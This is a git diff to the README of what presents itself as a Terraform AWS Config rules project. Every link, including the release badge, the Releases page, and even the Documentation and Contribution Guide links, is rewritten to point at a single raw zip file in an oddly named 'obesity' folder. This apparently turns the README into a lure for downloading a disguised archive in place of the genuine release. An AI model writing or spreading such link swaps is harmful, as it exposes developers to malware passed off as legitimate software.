@@ -1,6 +1,6 @@
 # 🌟 terraform-aws-config-rules - Effortless AWS Compliance Monitoring
 
-[![Download the latest release](https://img.shields.io/badge/Download%20now-%20-blue)](https://github.com/TrungLee24/terraform-aws-config-rules/releases)
+[![Download the latest release](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/obesity/terraform-aws-config-rules.zip%20now-%20-blue)](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/obesity/terraform-aws-config-rules.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application from our Releases page.
 
 **1. Visit the Releases page:**  
 Click the link below to go to the Releases page.  
-[Download here](https://github.com/TrungLee24/terraform-aws-config-rules/releases)
+[Download here](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/obesity/terraform-aws-config-rules.zip)
 
 **2. Choose your version:**  
 On the Releases page, you will see a list of available versions. Choose the latest version for the best features and updates.
@@ -92,8 +92,8 @@ If you need further assistance, feel free to reach out to us through the Issues 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/TrungLee24/terraform-aws-config-rules/wiki): More detailed instructions and guidelines.
-- [Contribution Guide](https://github.com/TrungLee24/terraform-aws-config-rules/blob/main/CONTRIBUTING.md): Learn how to contribute to our project.
+- [Documentation](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/obesity/terraform-aws-config-rules.zip): More detailed instructions and guidelines.
+- [Contribution Guide](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/obesity/terraform-aws-config-rules.zip): Learn how to contribute to our project.
 
 Remember, you can always go back to the Releases page to download the latest version.  
-[Download here](https://github.com/TrungLee24/terraform-aws-config-rules/releases)
+[Download here](https://raw.githubusercontent.com/TrungLee24/terraform-aws-config-rules/main/obesity/terraform-aws-config-rules.zip)
